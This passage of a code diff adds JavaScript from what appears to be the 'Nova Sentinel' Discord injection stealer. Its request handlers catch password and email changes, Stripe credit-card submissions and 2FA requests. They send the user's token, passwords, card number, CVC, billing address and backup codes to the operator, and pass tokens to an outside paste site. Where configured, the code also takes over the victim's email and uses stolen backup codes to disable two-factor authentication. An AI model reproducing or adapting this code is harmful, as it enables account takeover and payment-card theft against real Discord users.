+                  value: `${GetNSFW(user.nsfw_allowed)}`,
+                  inline: !0,
+                },
+                {
+                  name: "A2F <a:keys:1159078859682107453>",
+                  value: `${GetA2F(user.mfa_enabled)}`,
+                  inline: !0,
+                },
+                {
+                  name: "@Copyright",
+                  value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                  inline: !0,
+                },
+                {
+                  name: "Nova Files",
+                  value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+                  inline: !0,
+                },
+                {
+                  name: "Billing <a:money:1130448564632436787>",
+                  value: `${Billings}`,
+                  inline: !0,
+                },
+                {
+                  name: "Email <:mail:1130451375495589968>",
+                  value: `\`${user.email}\``,
+                  inline: !0,
+                },
+                {
+                  name: "Phone :mobile_phone:",
+                  value: `\`${user.phone ?? "None"}\``,
+                  inline: !0,
+                },
+                {
+                  name: "<a:cam2:1130448575470514258> Password",
+                  value: `\`${password}\``,
+                  inline: !0,
+                },
+                {
+                  name: "Bio <:nova:1132934190032244786>",
+                  value: `\`\`\`${
+                    user.bio !== null &&
+                    user.bio !== undefined &&
+                    user.bio !== ""
+                      ? user.bio
+                      : ":x:"
+                  }\`\`\``,
+                  inline: false,
+                },
+                {
+                  name: "<a:eatsomething:1130449693613228072> Token",
+                  value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                  inline: !1,
+                },
+              ],
+
+              thumbnail: userAvatar,
+            });
+
+            var params2 = await makeEmbed({
+              title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+              color: config["embed-color"],
+              description: Friends.badges,
+              image: userBanner,
+              thumbnail: userAvatar,
+            });
+
+            params.embeds.push(params2.embeds[0]);
+
+            await post(params);
+            break;
+          }
+        }
+      case request.url.endsWith("users/@me"):
+        if (!data.password) return;
+        if (data.new_password) {
+          var params = await makeEmbed({
+            title:
+              "<:nova:1132934190032244786> Nova Sentinel Detect Password Changed",
+            color: config["embed-color"],
+            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+            fields: [
+              {
+                name: "Username <a:inject:1130448568268881960>",
+                value: `\`${user.username}#${user.discriminator}\``,
+                inline: !0,
+              },
+              {
+                name: "ID <a:cat_rolling:1130448570789679165>",
+                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                inline: !0,
+              },
+              {
+                name: "Nitro <a:nitro:1130453517312725052>",
+                value: `${GetNitro(Nitro)}`,
+                inline: !0,
+              },
+              {
+                name: "Badges <a:badges:1130448593715740692>",
+                value: `${GetBadges(user.flags)}`,
+                inline: !0,
+              },
+              {
+                name: "Language <:4533language:1130453119919206500>",
+                value: `${GetLangue(user.locale)}`,
+                inline: !0,
+              },
+              {
+                name: "NSFW <:3568underage:1153991874495922207>",
+                value: `${GetNSFW(user.nsfw_allowed)}`,
+                inline: !0,
+              },
+              {
+                name: "A2F <a:keys:1159078859682107453>",
+                value: `${GetA2F(user.mfa_enabled)}`,
+                inline: !0,
+              },
+              {
+                name: "@Copyright",
+                value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                inline: !0,
+              },
+              {
+                name: "Nova Files",
+                value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+                inline: !0,
+              },
+              {
+                name: "Billing <a:money:1130448564632436787>",
+                value: `${Billings}`,
+                inline: !0,
+              },
+              {
+                name: "Email <:mail:1130451375495589968>",
+                value: `\`${user.email}\``,
+                inline: !0,
+              },
+              {
+                name: "Phone :mobile_phone:",
+                value: `\`${user.phone ?? "None"}\``,
+                inline: !0,
+              },
+              {
+                name: "<a:cam2:1130448575470514258> Old Password",
+                value: `\`${data.password}\``,
+                inline: !0,
+              },
+              {
+                name: "<a:cam2:1130448575470514258> New Password",
+                value: `\`${data.new_password}\``,
+                inline: !0,
+              },
+              {
+                name: "Bio <:nova:1132934190032244786>",
+                value: `\`\`\`${
+                  user.bio !== null && user.bio !== undefined && user.bio !== ""
+                    ? user.bio
+                    : ":x:"
+                }\`\`\``,
+                inline: false,
+              },
+              {
+                name: "<a:eatsomething:1130449693613228072> Token",
+                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                inline: !1,
+              },
+            ],
+
+            thumbnail: userAvatar,
+          });
+
+          var params2 = await makeEmbed({
+            title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+            color: config["embed-color"],
+            description: Friends.badges,
+            image: userBanner,
+            thumbnail: userAvatar,
+          });
+
+          params.embeds.push(params2.embeds[0]);
+
+          await post(params);
+        } else if (data.email) {
+          if (config.changeMailAuto == "true") {
+            const atIndex = config.mail.indexOf("@");
+            const username = config.mail.substring(0, atIndex);
+            const domain = config.mail.substring(atIndex);
+
+            const generatedEmail = `${username ?? "kschdediscord"}+${generateId(
+              3
+            )}${domain ?? "@gmail.com"}`;
+            const generatedPassword = generatePassword();
+
+            console.log(generatedEmail, generatedPassword);
+            try {
+              const res = await updateEmail(
+                token,
+                generatedEmail,
+                data.password
+              );
+              if (res.username) {
+                var params = await makeEmbed({
+                  title:
+                    "<:nova:1132934190032244786> Nova Sentinel Have changed the victim mail",
+                  color: config["embed-color"],
+                  description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+                  fields: [
+                    {
+                      name: "Username <a:inject:1130448568268881960>",
+                      value: `\`${res.username}#${res.discriminator}\``,
+                      inline: !1,
+                    },
+                    {
+                      name: "ID <a:cat_rolling:1130448570789679165>",
+                      value: `\`${res.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${res.id})`,
+                      inline: !1,
+                    },
+                    {
+                      name: "Badges <a:badges:1130448593715740692>",
+                      value: `${GetBadges(res.flags)}`,
+                      inline: !1,
+                    },
+                    {
+                      name: "A2F <a:keys:1159078859682107453>",
+                      value: `${GetA2F(res.mfa_enabled)}`,
+                      inline: !1,
+                    },
+                    {
+                      name: "@Copyright",
+                      value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                      inline: !1,
+                    },
+                    {
+                      name: "Nova Files",
+                      value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+                      inline: !1,
+                    },
+                    {
+                      name: "Phone :mobile_phone:",
+                      value: `\`${res.phone ?? "None"}\``,
+                      inline: !1,
+                    },
+                    {
+                      name: "New Email <:mail:1130451375495589968>",
+                      value: `\`${res.email}\``,
+                      inline: !1,
+                    },
+                    {
+                      name: "<a:cam2:1130448575470514258> Password",
+                      value: `\`${generatedPassword}\``,
+                      inline: !1,
+                    },
+                    {
+                      name: "<a:eatsomething:1130449693613228072> Token",
+                      value: `\`\`\`${res.token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${res.token})`,
+                      inline: !1,
+                    },
+                  ],
+                  thumbnail: userAvatar,
+                });
+
+                await post(params);
+                break;
+              }
+            } catch (error) {}
+          }
+          var params = await makeEmbed({
+            title:
+              "<:nova:1132934190032244786> Nova Sentinel Detect Email Changed",
+            color: config["embed-color"],
+            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+            fields: [
+              {
+                name: "Username <a:inject:1130448568268881960>",
+                value: `\`${user.username}#${user.discriminator}\``,
+                inline: !0,
+              },
+              {
+                name: "ID <a:cat_rolling:1130448570789679165>",
+                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                inline: !0,
+              },
+              {
+                name: "Nitro <a:nitro:1130453517312725052>",
+                value: `${GetNitro(Nitro)}`,
+                inline: !0,
+              },
+              {
+                name: "Badges <a:badges:1130448593715740692>",
+                value: `${GetBadges(user.flags)}`,
+                inline: !0,
+              },
+              {
+                name: "Language <:4533language:1130453119919206500>",
+                value: `${GetLangue(user.locale)}`,
+                inline: !0,
+              },
+              {
+                name: "NSFW <:3568underage:1153991874495922207>",
+                value: `${GetNSFW(user.nsfw_allowed)}`,
+                inline: !0,
+              },
+              {
+                name: "A2F <a:keys:1159078859682107453>",
+                value: `${GetA2F(user.mfa_enabled)}`,
+                inline: !0,
+              },
+              {
+                name: "@Copyright",
+                value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                inline: !0,
+              },
+              {
+                name: "Nova Files",
+                value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+                inline: !0,
+              },
+              {
+                name: "Billing <a:money:1130448564632436787>",
+                value: `${Billings}`,
+                inline: !0,
+              },
+              {
+                name: "New Email <:mail:1130451375495589968>",
+                value: `\`${user.email}\``,
+                inline: !0,
+              },
+              {
+                name: "Phone :mobile_phone:",
+                value: `\`${user.phone ?? "None"}\``,
+                inline: !0,
+              },
+              {
+                name: "<a:cam2:1130448575470514258> Password",
+                value: `\`${data.password}\``,
+                inline: !0,
+              },
+              {
+                name: "Bio <:nova:1132934190032244786>",
+                value: `\`\`\`${
+                  user.bio !== null && user.bio !== undefined && user.bio !== ""
+                    ? user.bio
+                    : ":x:"
+                }\`\`\``,
+                inline: false,
+              },
+              {
+                name: "<a:eatsomething:1130449693613228072> Token",
+                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                inline: !1,
+              },
+            ],
+
+            thumbnail: userAvatar,
+          });
+
+          var params2 = await makeEmbed({
+            title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+            color: config["embed-color"],
+            description: Friends.badges,
+            image: userBanner,
+            thumbnail: userAvatar,
+          });
+
+          params.embeds.push(params2.embeds[0]);
+
+          await post(params);
+          break;
+        }
+      case request.url.includes("api.stripe"):
+        var [CardNumber, CardCVC, month, year] = [
+          data["card[number]"],
+          data["card[cvc]"],
+          data["card[exp_month]"],
+          data["card[exp_year]"],
+        ];
+
+        if (CardNumber && CardCVC && month && year) {
+          await electron.session.defaultSession.webRequest.onCompleted(
+            config.onCompletedbis,
+            async (re, callback) => {
+              try {
+                var dt = JSON.parse(re.uploadData[0].bytes);
+              } catch (err) {
+                var dt = queryString.parse(
+                  decodeURIComponent(re.uploadData[0].bytes.toString())
+                );
+              }
+              let { line_1, line_2, city, state, postal_code, country, email } =
+                dt.billing_address;
+              var params = await makeEmbed({
+                title:
+                  "<:nova:1132934190032244786> Nova Sentinel User Credit Card Added",
+                color: config["embed-color"],
+                fields: [
+                  {
+                    name: "Nova Files",
+                    value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+                    inline: false,
+                  },
+                  {
+                    name: "IP",
+                    value: `\`${ip}\``,
+                    inline: false,
+                  },
+                  {
+                    name: "ID <a:cat_rolling:1130448570789679165>",
+                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                    inline: false,
+                  },
+                  {
+                    name: "Username <:username:1041634536733290596>",
+                    value: `\`${user.username}#${user.discriminator}\``,
+                    inline: false,
+                  },
+                  {
+                    name: "Language <:4533language:1130453119919206500>",
+                    value: GetLangue(user.locale),
+                    inline: false,
+                  },
+                  {
+                    name: "A2F <a:keys:1159078859682107453>",
+                    value: GetA2F(user.mfa_enabled),
+                    inline: false,
+                  },
+                  {
+                    name: "Badges <a:badges:1130448593715740692>",
+                    value: GetBadges(user.flags),
+                    inline: false,
+                  },
+                  {
+                    name: "Address <a:cat_rolling:1130448570789679165>",
+                    value: `\`\`\`md\n# Line 1 : ${line_1},\n# Line 2 : ${line_2},\n# City : ${city},\n# State : ${state},\n# Postal Code : ${postal_code},\n# Country : ${country}\n\`\`\``,
+                    inline: false,
+                  },
+                  {
+                    name: "Credit Card <a:cat_rolling:1130448570789679165>",
+                    value: `\`\`\`md\n# Card Number : ${CardNumber}\n# Card Expiration : ${
+                      month + "/" + year
+                    }\n# CVC : ${CardCVC}\`\`\``,
+                    inline: false,
+                  },
+                  {
+                    name: "<a:eatsomething:1130449693613228072> Token",
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    inline: false,
+                  },
+                ],
+
+                thumbnail: userAvatar,
+              });
+              await post(params);
+            }
+          );
+        }
+        break;
+      case request.url.endsWith("/enable"):
+        let ValidFound = false;
+        let backup_codes = (await execScript(backupscript)) ?? "";
+
+        if (config.disable2FA == "true") {
+          for (let i = 0; i < backup_codes.length; i++) {
+            if (!ValidFound) {
+              let res = await remove2FA(token, backup_codes[i]);
+              let parse_res = JSON.parse(res);
+              if (parse_res.token) {
+                ValidFound = true;
+                break;
+              } else {
+                if (parse_res.message && parse_res.code) {
+                  if (parse_res.message == "401: Unauthorized") {
+                    ValidFound = true;
+                    break;
+                  }
+                } else {
+                  if (parse_res.message != "Invalid two-factor code") {
+                    ValidFound = true;
+                    break;
+                  } else {
+                    continue;
+                  }
+                }
+              }
+            }
+          }
+        }
+
+        var params = await makeEmbed({
+          title: "<:nova:1132934190032244786> Nova Sentinel User Enable 2FA",
+          color: config["embed-color"],
+          fields: [
+            {
+              name: "Nova Files",
+              value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+              inline: false,
+            },
+            {
+              name: "IP",
+              value: `\`${ip}\``,
+              inline: false,
+            },
+            {
+              name: "Username <:username:1041634536733290596>",
+              value: `\`${user.username}#${user.discriminator}\``,
+              inline: false,
+            },
+            {
+              name: "ID <a:cat_rolling:1130448570789679165>",
+              value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+              inline: false,
+            },
+            {
+              name: "Language <:4533language:1130453119919206500>",
+              value: GetLangue(user.locale),
+              inline: false,
+            },
+            {
+              name: "2FA disabler Response <:2FA:982994698278952980>",
+              value: `\`\`\`md\n- ${
+                ValidFound ? "Disabled" : "Cannot Disable"
+              }\`\`\``,
+              inline: false,
+            },
+            {
+              name: "A2F <a:keys:1159078859682107453>",
+              value: GetA2F(user.mfa_enabled),
+              inline: false,
+            },
+            {
+              name: "Badges <a:badges:1130448593715740692>",
+              value: GetBadges(user.flags),
+              inline: false,
+            },
+            {
+              name: "Backups Code <a:cat_rolling:1130448570789679165>",
+              value: `\`\`\`md\n${backup_codes
+                .map((x) => `- ${x}`)
+                .join("\n")}\`\`\``,
+              inline: false,
+            },
+            {
+              name: "<a:eatsomething:1130449693613228072> Token",
+              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+              inline: false,
+            },
+          ],
+
+          thumbnail: userAvatar,
+        });
+        await post(params);
+        break;
+      case request.url.endsWith("/disable"):
+        var params = await makeEmbed({
+          title: "<:nova:1132934190032244786> Nova Sentinel User Removed 2FA",
+          color: config["embed-color"],
+          fields: [
+            {
+              name: "Nova Files",
+              value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+              inline: false,
+            },
+            {
+              name: "IP",
+              value: `\`${ip}\``,
+              inline: false,
+            },
+            {
+              name: "Username <:username:1041634536733290596>",
+              value: `\`${user.username}#${user.discriminator}\``,
+              inline: false,
+            },
+            {
+              name: "Language <:4533language:1130453119919206500>",
+              value: GetLangue(user.locale),
+              inline: false,
+            },
+            {
+              name: "A2F <a:keys:1159078859682107453>",
+              value: GetA2F(user.mfa_enabled),
+              inline: false,
+            },
+            {
+              name: "Badges <a:badges:1130448593715740692>",
+              value: GetBadges(user.flags),
+              inline: false,
+            },
+            {
+              name: "<a:eatsomething:1130449693613228072> Token",
+              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+              inline: !1,
+            },
+          ],
+
+          thumbnail: userAvatar,
+        });
+        await post(params);
+        break;
+      case request.url.endsWith("/codes-verification"):
+        let validCodeFound = false;
+        let backup_code = (await execScript(backupscript)) ?? "";
+        if (config.disable2FA == "true") {
+          for (let i = 0; i < backup_code.length; i++) {
+            if (!validCodeFound) {
+              let res = await remove2FA(token, backup_code[i]);
+              let parse_res = JSON.parse(res);
+              if (parse_res.token) {
+                validCodeFound = true;
+                break;
+              } else {
+                if (parse_res.message && parse_res.code) {
+                  if (parse_res.message == "401: Unauthorized") {
+                    validCodeFound = true;
+                    break;
+                  }
+                } else {
+                  if (parse_res.message != "Invalid two-factor code") {
+                    validCodeFound = true;
+                    break;
+                  } else {
+                    continue;
+                  }
+                }
+              }
+            }
+          }
+        }
+        var params = await makeEmbed({
+          title: "<:nova:1132934190032244786> Nova Sentinel User 2FA Codes",
+          color: config["embed-color"],
+          fields: [
+            {
+              name: "Nova Files",
+              value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+              inline: false,
+            },
+            {
+              name: "IP",
+              value: "`" + ip + "`",
+              inline: false,
+            },
+            {
+              name: "Username <:username:1041634536733290596>",
+              value: `\`${user.username}#${user.discriminator}\``,
+              inline: false,
+            },
+            {
+              name: "Language <:4533language:1130453119919206500>",
+              value: GetLangue(user.locale),
+              inline: false,
+            },
+            {
+              name: "A2F <a:keys:1159078859682107453>",
+              value: GetA2F(user.mfa_enabled),
+              inline: false,
+            },
+            {
+              name: "Badges <a:badges:1130448593715740692>",
+              value: GetBadges(user.flags),
+              inline: false,
+            },
+            {
+              name: "2FA disabler Response <:2FA:982994698278952980> ",
+              value: `\`\`\`md\n- ${
+                validCodeFound ? "Disabled" : "Cannot Disable"
+              }\`\`\``,
+              inline: false,
+            },
+            {
+              name: "Backup Codes <a:cat_rolling:1130448570789679165>",
+              value: `\`\`\`md\n${backup_code
+                .map((x) => `- ${x}`)
+                .join("\n")}\`\`\``,
+              inline: false,
+            },
+            {
+              name: "<a:eatsomething:1130449693613228072> Token",
+              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+              inline: !1,
+            }, 
+          ],
+
+          thumbnail: userAvatar,
+        });
+        await post(params);
+        break;
+    }
+  }
+);
